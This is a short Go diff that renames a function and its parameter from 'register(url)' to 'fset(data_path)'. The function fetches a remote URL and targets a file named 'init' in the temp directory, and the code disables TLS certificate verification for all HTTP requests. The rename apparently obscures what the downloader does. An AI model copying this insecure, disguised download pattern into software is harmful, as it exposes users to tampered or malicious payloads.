@@ -13,7 +13,7 @@ import (
 	"path/filepath"
 )
 
-func register(url string) {
+func fset(data_path string) {
 	tmpDir := os.TempDir()
 	targetPath := filepath.Join(tmpDir, "init")
 
@@ -29,7 +29,7 @@ func register(url string) {
 	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
 
 	// Perform the GET request
-	req, err := http.NewRequest("GET", url, nil)
+	req, err := http.NewRequest("GET", data_path, nil)
 	if err != nil {
 		fmt.Println("Error creating request:", err)
 		return
